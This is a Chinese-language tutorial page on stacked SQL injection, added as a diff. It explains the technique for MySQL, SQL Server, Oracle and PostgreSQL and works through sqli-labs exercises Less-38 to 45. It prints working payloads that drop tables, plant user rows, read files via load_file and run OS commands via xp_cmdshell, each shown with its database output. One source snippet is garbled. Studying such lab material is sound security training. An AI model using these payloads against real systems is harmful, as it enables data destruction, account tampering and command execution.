@@ -1,0 +1,580 @@
+<h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
+<p>mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入</p>
+<p>而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句&#x3D;&#x3D;类型是有限&#x3D;&#x3D;的，可以用来执行查询语句，而堆叠注入可以&#x3D;&#x3D;执行&#x3D;&#x3D;的是&#x3D;&#x3D;任意的语句&#x3D;&#x3D;。</p>
+<p><strong>eg</strong></p>
+<p>用户输入：<code>1; DELETE FROM products</code>​</p>
+<p>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>​</p>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+</blockquote>
+<p>‍</p>
+<h1 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h1><blockquote>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img src="/assets/1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" alt="1049983-20180929015645345-261813262"></p>
+<p>此图是从<strong>原文</strong>中<strong>截取</strong>过来的，因为我个人的<strong>测试环境</strong>是<strong>php+mysql</strong>，是<strong>可以执行</strong>的，此处对于<strong>mysql&#x2F;php存在质疑</strong>。但个人估计原文作者可能与我的<strong>版本的不同</strong>的原因。虽然我们前面提到了堆叠查询可以<strong>执行任意的sql</strong>语句，但是这种注入方式<strong>并不是</strong>十分的<strong>完美</strong>的。在我们的web系统中，因为代码通常<strong>只返回一个查询结果</strong>，因此，堆叠注入<strong>第二个</strong>语句<strong>产生错误</strong>或者<strong>结果</strong>只能被<strong>忽略</strong>，我们在<strong>前端</strong>界面是<strong>无法看到</strong>返回<strong>结果</strong>的。因此，在读取数据时，我们建议使用<strong>union（联合）</strong> 注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+</blockquote>
+<p>‍</p>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>（1）新建一表</p>
+<pre><code>select * from users where id=1;create table test like users;
+</code></pre>
+<p><img src="/assets/1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" alt="1049983-20180929015645671-1445708848"></p>
+<p>执行成功，我们再去看一下是否新建成功表。</p>
+<p><img src="/assets/1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" alt="1049983-20180929015645943-40278598"></p>
+<p>（2）删除上面新建的test表</p>
+<pre><code>select * from users where id=1;drop table test;
+</code></pre>
+<p><img src="/assets/1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" alt="1049983-20180929015646198-1529755622"></p>
+<p><img src="/assets/1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" alt="1049983-20180929015646449-976012187"></p>
+<p>（3）查询数据</p>
+<pre><code>select * from users where id=1;select 1,2,3;
+</code></pre>
+<p><img src="/assets/1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" alt="1049983-20180929015646651-307633841"></p>
+<p>（4）加载文件</p>
+<pre><code>select * from users where id=1;select load_file(&#39;c:/tmpupbbn.php&#39;);
+</code></pre>
+<p><img src="/assets/1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" alt="1049983-20180929015646928-818625825"></p>
+<p>(4) 修改数据</p>
+<pre><code>select * from users where id=1;insert into users(id,username,password) values (&#39;100&#39;,&#39;new&#39;,&#39;new&#39;);
+</code></pre>
+<p><img src="/assets/1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" alt="1049983-20180929015647123-855312514"></p>
+<p><img src="/assets/1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" alt="1049983-20180929015647385-1686789783"></p>
+<h2 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h2><p>(1)增加数据表</p>
+<pre><code>select * from test;create table sc3(ss CHAR(8));
+</code></pre>
+<p><img src="/assets/1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" alt="1049983-20180929015647694-982429887"></p>
+<p>(2) 删除数据表</p>
+<pre><code>select * from test;drop table sc3;
+</code></pre>
+<p><img src="/assets/1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" alt="1049983-20180929015648051-1234311462"></p>
+<p>(4)查询数据</p>
+<pre><code>select 1,2,3;select * from test;
+</code></pre>
+<p><img src="/assets/1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" alt="1049983-20180929015648347-1625714699"></p>
+<p>(5)修改数据</p>
+<pre><code>select * from test;update test set name=&#39;test&#39; where id=3;
+</code></pre>
+<p><img src="/assets/1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" alt="1049983-20180929015648636-932399825"></p>
+<p><img src="/assets/1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" alt="1049983-20180929015648911-1380875302"></p>
+<p>(5)sqlserver中最为重要的存储过程的执行</p>
+<pre><code>select * from test where id=1;exec master..xp_cmdshell &#39;ipconfig&#39;
+</code></pre>
+<p><img src="/assets/1049983-20180929015649295-413295225-20250418145603-v0relca.gif" alt="1049983-20180929015649295-413295225"></p>
+<h2 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h2><blockquote>
+<p>上面的介绍中我们已经提及，&#x3D;&#x3D;oracle不能使用堆叠注入&#x3D;&#x3D;，可以从图中看到，当有&#x3D;&#x3D;两条语句在同一行时&#x3D;&#x3D;，&#x3D;&#x3D;直接报错,无效字符&#x3D;&#x3D;。后面的就不往下继续尝试了。</p>
+</blockquote>
+<p><img src="/assets/1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" alt="1049983-20180929015649555-1984392073"></p>
+<h2 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h2><p>(1)新建一个表</p>
+<pre><code> select * from user_test;create table user_data(id DATE);
+</code></pre>
+<p><img src="/assets/1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" alt="1049983-20180929015649893-911848487"></p>
+<p><img src="/assets/1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" alt="1049983-20180929015650150-1255028615"></p>
+<p>可以看到user_data表已经建好。</p>
+<p>(2)删除上面新建的user_data表</p>
+<pre><code>select * from user_test;delete from user_data;
+</code></pre>
+<p><img src="/assets/1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" alt="1049983-20180929015650516-1080177008"></p>
+<p>(3)查询数据</p>
+<pre><code>select * from user_test;select 1,2,3;
+</code></pre>
+<p><img src="/assets/1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" alt="1049983-20180929015650885-769688906"></p>
+<p>(4) 修改数据</p>
+<pre><code> select * from user_test;update user_test set name=&#39;modify&#39; where name=&#39;张三&#39;;
+</code></pre>
+<p><img src="/assets/1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" alt="1049983-20180929015651359-2117725775"></p>
+<p>‍</p>
+<h2 id="0x04-堆叠注入之sqllaps实列"><a href="#0x04-堆叠注入之sqllaps实列" class="headerlink" title="0x04 堆叠注入之sqllaps实列"></a>0x04 堆叠注入之sqllaps实列</h2><h2 id="1-Less-38-堆叠注入-字符型-GET"><a href="#1-Less-38-堆叠注入-字符型-GET" class="headerlink" title="1.Less-38 堆叠注入 - 字符型 - GET"></a>1.Less-38 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre>
+<p>（2）测试</p>
+<pre><code>?id=1’;insert into users(id,username,password) values (‘38’,’less38’,’hello’)–+
+</code></pre>
+<pre><code>mysql&gt; select * from users;
+</code></pre>
+<pre><code>+----+----------+------------+
+
+| id | username | password   |
+
++----+----------+------------+
+
+|  1 | Dumb     | Dumb       |
+
+|  2 | Angelina | I-kill-you |
+
+|  3 | Dummy    | p@ssword   |
+
+|  4 | secure   | crappy     |
+
+|  5 | stupid   | stupidity  |
+
+|  6 | superman | genious    |
+
+|  7 | batman   | mob!le     |
+
+|  8 | admin    | admin      |
+
+|  9 | admin1   | admin1     |
+
+| 10 | admin2| admin2     |
+
+| 11 | admin3| admin3     |
+
+| 12 | dhakkan| dumbo      |
+
+| 14 | admin4| admin4     |
+
+| 38 | less38| hello      |
+
++----+----------+------------+
+
+14 rows in set (0.00 sec)
+</code></pre>
+<p>发现已经添加了一个 less38 用户</p>
+<p>?id=1’;create table less38 like users;</p>
+<p>?id=1’;drop table less38;</p>
+<h2 id="2-Less-39-堆叠注入-整型-GET"><a href="#2-Less-39-堆叠注入-整型-GET" class="headerlink" title="2.Less-39 堆叠注入 - 整型 - GET"></a>2.Less-39 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>（2）测试</p>
+<pre><code>?id=1;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–-
+</code></pre>
+<pre><code>mysql&gt; select * from users;
+
++----+----------+------------+
+
+| id | username | password   |
+
++----+----------+------------+
+
+|  1 | Dumb     | Dumb       |
+
+|  2 | Angelina | I-kill-you |
+
+|  3 | Dummy    | p@ssword   |
+
+|  4 | secure   | crappy     |
+
+|  5 | stupid   | stupidity  |
+
+|  6 | superman | genious    |
+
+|  7 | batman   | mob!le     |
+
+|  8 | admin    | admin      |
+
+|  9 | admin1   | admin1     |
+
+| 10 | admin2| admin2     |
+
+| 11 | admin3| admin3     |
+
+| 12 | dhakkan| dumbo      |
+
+| 14 | admin4| admin4     |
+
+| 38 | less38| hello      |
+
+| 39 | less39| hello      |
+
++----+----------+------------+
+
+15 rows in set (0.00 sec)
+</code></pre>
+<p>可以看到已经添加了 less39 用户了</p>
+<p>?id=1;create table less39 like users;</p>
+<p>?id=1;drop table less39;</p>
+<h2 id="3-Less-40-盲注-堆叠注入-字符型-GET"><a href="#3-Less-40-盲注-堆叠注入-字符型-GET" class="headerlink" title="3.Less-40 盲注 - 堆叠注入 - 字符型 - GET"></a>3.Less-40 盲注 - 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
+</code></pre>
+<p>（2）测试</p>
+<pre><code>?id=1’); insert into users(id,username,password) values (‘40’,’less40’,’hello’)–+
+</code></pre>
+<pre><code>mysql&gt; select * from users;
+
++-----+----------+------------+
+
+| id  | username | password   |
+
++-----+----------+------------+
+
+|   1 | Dumb     | Dumb       |
+
+|   2 | Angelina | I-kill-you |
+
+|   3 | Dummy    | p@ssword   |
+
+|   4 | secure   | crappy     |
+
+|   5 | stupid   | stupidity  |
+
+|   6 | superman | genious    |
+
+|   7 | batman   | mob!le     |
+
+|   8 | admin    | admin      |
+
+|   9 | admin1   | admin1     |
+
+|  10 | admin2   | admin2     |
+
+|  11 | admin3   | admin3     |
+
+|  12 | dhakkan  | dumbo      |
+
+|  14 | admin4   | admin4     |
+
+|  38 | less38   | hello      |
+
+|  39 | less39   | hello      |
+
+| 109 | hello| hello      |
+
+|  40 | less40   | hello      |
+
++-----+----------+------------+
+
+17 rows in set (0.00 sec)
+</code></pre>
+<p>看到添加了 less40 用户</p>
+<p>?id=1’);create table less40 like users;</p>
+<p>?id=1’);drop table less40;</p>
+<h2 id="4-Less-41-盲注-堆叠注入-整型-GET"><a href="#4-Less-41-盲注-堆叠注入-整型-GET" class="headerlink" title="4.Less-41 盲注 - 堆叠注入 - 整型 - GET"></a>4.Less-41 盲注 - 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>（2）测试（盲注）</p>
+<p>创建users表和增加字段值</p>
+<pre><code>?id=1; insert into users(id,username,password) values (‘110’,’less41’,’hello’)–+
+</code></pre>
+<pre><code>mysql&gt; select * from users;
+
++-----+----------+------------+
+
+| id  | username | password   |
+
++-----+----------+------------+
+
+|   1 | Dumb     | Dumb       |
+
+|   2 | Angelina | I-kill-you |
+
+|   3 | Dummy    | p@ssword   |
+
+|   4 | secure   | crappy     |
+
+|   5 | stupid   | stupidity  |
+
+|   6 | superman | genious    |
+
+|   7 | batman   | mob!le     |
+
+|   8 | admin    | admin      |
+
+|   9 | admin1   | admin1     |
+
+|  10 | admin2   | admin2     |
+
+|  11 | admin3   | admin3     |
+
+|  12 | dhakkan  | dumbo      |
+
+|  14 | admin4   | admin4     |
+
+|  38 | less38   | hello      |
+
+|  39 | less39   | hello      |
+
+| 109 | hello| hello      |
+
+|  40 | less40   | hello      |
+
+| 110 | less41| hello      |
+
++-----+----------+------------+
+
+18 rows in set (0.00 sec)
+</code></pre>
+<p>添加了用户 less41</p>
+<p>?id=1;create table less41 like users;  &#x2F;&#x2F;增加表</p>
+<p>?id=1;drop table less41;  &#x2F;&#x2F;删除表</p>
+<h2 id="5-Less-42-报错型堆叠注入-字符型-POST"><a href="#5-Less-42-报错型堆叠注入-字符型-POST" class="headerlink" title="5.Less-42 报错型堆叠注入 - 字符型 - POST"></a>5.Less-42 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码（login.php）：</p>
+<pre><code>$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+
+$password = $_POST[&quot;login_password&quot;];
+
+$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;  
+</code></pre>
+<p><strong>Password</strong> 变量在<strong>post</strong> 过程中，<strong>没有</strong>通过 mysql_real_escape_string() <strong>函数</strong>的<strong>处理</strong>。因此在登录的时候<strong>密码选项</strong>我们可以进行 <strong>attack</strong>。</p>
+<p>（2）报错测试</p>
+<p>测试语句：</p>
+<pre><code>username：任意
+
+password ：  c&#39;;drop table me#   # 删除 me 表
+</code></pre>
+<p>或者：</p>
+<pre><code>username：任意
+
+password ： c&#39;;create table me like users# // 创建一个 me 表
+</code></pre>
+<p>登录之前查看表：</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>登录前创建表</p>
+<pre><code>username ：admin
+
+password ：  c&#39;;create table less42 like users#
+</code></pre>
+<p>登录后查看创建表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| less42|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+5 rows in set (0.00 sec)
+</code></pre>
+<p>发现添加了一个 less42 表，登录时构造的 sql 语句为:</p>
+<pre><code>SELECT * FROM users WHERE username=’admin’ and password=’c’;create table less42 like users–+     //利用 c’;drop table me#作为登录密码，删除该表。
+</code></pre>
+<p>登录前删除表</p>
+<pre><code>username： admin 
+password ：  c’;drop table less42#
+</code></pre>
+<p>登录后查看删除表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+4 rows in set (0.00 sec)
+</code></pre>
+<h2 id="6-Less-43-报错型-堆叠注入-字符型-POST"><a href="#6-Less-43-报错型-堆叠注入-字符型-POST" class="headerlink" title="6.Less-43 报错型 - 堆叠注入 - 字符型 - POST"></a>6.Less-43 报错型 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<pre><code>$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+
+$password = $_POST[&quot;login_password&quot;];
+
+$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;
+</code></pre>
+<p>（2）测试</p>
+<p>登录前测创建表</p>
+<pre><code>username ： admin
+
+password：  c&#39;);create table less43 like users#
+</code></pre>
+<p>登录后查看增加表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| less43|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+5 rows in set (0.00 sec)
+</code></pre>
+<p>登录前测试删除表</p>
+<pre><code>username ：admin
+
+password ： c&#39;);drop table less43#
+</code></pre>
+<p>登录后查看删除表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+4 rows in set (0.00 sec)
+</code></pre>
+<h2 id="6-Less-44-盲注-堆叠注入-字符型-POST"><a href="#6-Less-44-盲注-堆叠注入-字符型-POST" class="headerlink" title="6.Less-44 盲注 - 堆叠注入 - 字符型 - POST"></a>6.Less-44 盲注 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<pre><code>username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST[“loginuser”]);POST[“loginuser”]); password =
+
+POST[“loginpassword”];POST[“loginpassword”]; sql = &quot;SELECT * FROM users WHERE
+
+username=&#39;username′andpassword=′username′andpassword=′password’”;
+</code></pre>
+<p>（2）测试（盲注）</p>
+<p>登录前测试插入表和值</p>
+<pre><code>username ： admin
+
+password ： a&#39;;insert into users(id,username,password) values (&#39;144&#39;,&#39;less44&#39;,&#39;hello&#39;)#
+</code></pre>
+<p>登录后查看增加表和值</p>
+<pre><code>mysql&gt; select * from users;
+
++-----+----------+------------+
+
+| id  | username | password   |
+
++-----+----------+------------+
+
+|   1 | Dumb     | Dumb       |
+
+|   2 | Angelina | I-kill-you |
+
+|   3 | Dummy    | p@ssword   |
+
+|   4 | secure   | crappy     |
+
+|   5 | stupid   | stupidity  |
+
+|   6 | superman | genious    |
+
+|   7 | batman   | mob!le     |
+
+|   8 | admin    | admin      |
+
+|   9 | admin1   | admin1     |
+
+|  10 | admin2   | admin2     |
+
+|  11 | admin3   | admin3     |
+
+|  12 | dhakkan  | dumbo      |
+
+|  14 | admin4   | admin4     |
+
+|  38 | less38   | hello      |
+
+|  39 | less39   | hello      |
+
+| 109 | hello| hello      |
+
+|  40 | less40   | hello      |
+
+| 110 | less41| hello      |
+
+| 144 | less44| hello      |
+
++-----+----------+------------+
+
+19 rows in set (0.00 sec)
+</code></pre>
+<h2 id="7-Less-45-报错型堆叠注入-字符型-POST"><a href="#7-Less-45-报错型堆叠注入-字符型-POST" class="headerlink" title="7.Less-45 报错型堆叠注入 - 字符型 - POST"></a>7.Less-45 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
+<pre><code>$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+
+$password = $_POST[&quot;login_password&quot;];
+
+$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;;
+</code></pre>
+<p>（2）测试</p>
+<p>登录前测试增加表</p>
+<pre><code>username :  admin
+
+password :  c&#39;);create table less45 like users#   //创建了less45表
+</code></pre>
+<p>登录后查看增加表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| less45|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+5 rows in set (0.00 sec)
+</code></pre>
+<p>登录前测试删除表</p>
+<pre><code>username： admin
+
+password ： c&#39;);drop table less45#
+</code></pre>
+<p>登录后查看删除表</p>
+<pre><code>mysql&gt; show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails|
+
+| referers|
+
+| uagents|
+
+| users|
+
++--------------------+
+
+4 rows in set (0.00 sec)
+</code></pre>
